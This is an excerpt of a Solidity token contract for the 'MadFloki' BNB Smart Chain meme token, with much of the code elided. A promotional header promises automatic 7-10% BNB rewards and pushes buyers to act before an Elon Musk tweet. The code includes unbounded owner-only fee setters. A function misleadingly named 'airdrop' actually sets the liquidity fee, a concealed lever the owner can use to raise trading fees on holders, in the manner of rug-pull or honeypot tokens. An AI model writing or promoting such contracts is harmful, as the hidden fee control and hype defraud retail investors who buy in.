...
Simply hold $mFloki tokens and get rewarded 7-10% of the transaction in BNB straight to your wallet

FLOKI Names are trending everywhere and doing wonders!

🔥It automatically delivers you BNB to your wallet every 20 minutes 🔥

Fill up your wallet before Elon Musk's next tweet!

💰Tokenomics:

👼🏻 Total Supply: 100 Billion

💴 7% BNB rewards on all buys

💴 10% BNB rewards on all sells

🔈 TG: https://t.me/MadFlokiBSC
*/
...
contract Madfloki is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("MadFloki", "mFloki") public {
    ...
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        ...
        function set_rewards_fee(uint256 value) external onlyOwner{
            rewardsFee = value;
        }
    ...
    function setMarketingWallet(address payable wallet) external onlyOwner{
        ...
        function set_liquidity_fee(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ...
        function airdrop(uint256 value) external onlyOwner{
            liquidityFee = value;
        }
